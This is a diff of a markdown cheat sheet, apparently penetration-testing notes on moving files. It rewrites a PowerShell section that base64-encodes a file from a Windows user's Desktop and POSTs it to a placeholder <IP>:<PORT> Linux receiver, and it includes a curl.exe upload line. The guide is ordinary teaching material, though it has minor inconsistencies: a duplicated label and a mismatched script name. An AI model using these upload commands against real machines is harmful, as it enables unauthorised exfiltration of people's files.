@@ -212,21 +212,42 @@ curl.exe -X POST http://<IP>:<PORT>/upload -F "files=@C:\Users\Cartman\Desktop\F
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>  
 <summary><h4>PowerShell Base64 Web Upload</h4></summary>  
 
-**Destination Machine (Linux): We use Netcat to listen in on a port we specify and send the file as a POST request.**
+Script needed: [linux_file_receiver.py](../scripts/file_transfers/linux_file_receiver.py)
+
+**Destination Machine (Linux): Destination Machine (Linux): Start Web Server**
+
 ```bash
-nc -lvnp <PORT>
+# Start server (default port 4444)
+python3 file_receiver.py
+
+# Start server on custom port
+python3 file_receiver.py --port <PORT>
 ```
 
-**Source Machine (Windows): PowerShell Script to Upload a File to Python Upload Server**
+**Source Machine (Windows): Convert file to Base64 string**
+
 ```powershell
-$b64 = [System.convert]::ToBase64String((Get-Content -Path '<FILE PATH>' -Encoding Byte))
-Invoke-WebRequest -Uri http://<IP>:<PORT>/ -Method POST -Body $b64
+$b64 = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\Cartman\Desktop\ThisisATextFile.txt"))
 ```
 
-**Destination Machine (Linux): We copy the output and use the base64 decode function to convert the base64 string into a file.**
-```bash
-echo <BASE64 FILE> | base64 -d -w 0 > <FILE>
+**Source Machine (Windows): Send to Linux server**
+
+```powershell
+Invoke-WebRequest -Uri "http://<IP>:<PORT>/" -Method POST -Body $b64 -ContentType "text/plain"
 ```
+
+**Destination Machine (Linux): Rename and restore original format**
+
+```bash
+mv <RECEIVED FILE> <FILE>
+```
+
+**Destination Machine (Linux): Verify file integrity**
+
+```bash
+file ThisisATextFile.txt
+```
+
 </details>
 </details>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details> 
